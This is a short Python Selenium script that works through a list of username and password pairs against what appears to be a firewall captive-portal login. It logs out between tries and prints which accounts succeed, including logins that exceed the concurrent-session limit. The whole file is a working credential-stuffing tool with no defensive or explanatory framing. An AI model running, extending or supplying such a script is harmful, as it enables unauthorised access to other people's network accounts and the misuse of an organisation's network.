from selenium import webdriver
from selenium.common.exceptions import TimeoutException
driver = webdriver.Chrome('./chromedriver')
driver.set_page_load_timeout(10)
with open('keepaliveurl','r') as f1:
    logout_url = f1.readline()

baseurl = 'https://facebook.com'
with open('users.txt','r') as f:
    while(True):
        try:
            driver.get(logout_url)
            if '172' in driver.title:
                driver.get(baseurl)
            elif 'Facebook' in driver.title:
                driver.get(logout_url)
                logout=driver.find_element_by_link_text('logout')
                logout.click()
                continue
            elif 'Firewall' in driver.title:
                logout=driver.find_element_by_link_text('logout')
                logout.click()
                continue
            line = f.readline()
            if line == '':
                print('\nDone!')
                break
            username = line[:9]
            password = line[10:-1]

            elem = driver.find_element_by_name('username')
            #elem.clear()
            elem.send_keys(username + '\t' + password + '\n')
            if "failed" in driver.find_element_by_tag_name('h2').text:
                print('failed! %s' %(username))
            elif 'concurrent' in driver.find_element_by_tag_name('h2').text:
                print('Success %s:%s with overlimit'%(username, password))
            elif 'Keepalive' in driver.title:
                print('Success %s:%s'%(username,password))
            else:
                print('Unknown')
        except TimeoutException:
            print('timed out...retrying...')
            driver.get(logout_url)
driver.close()
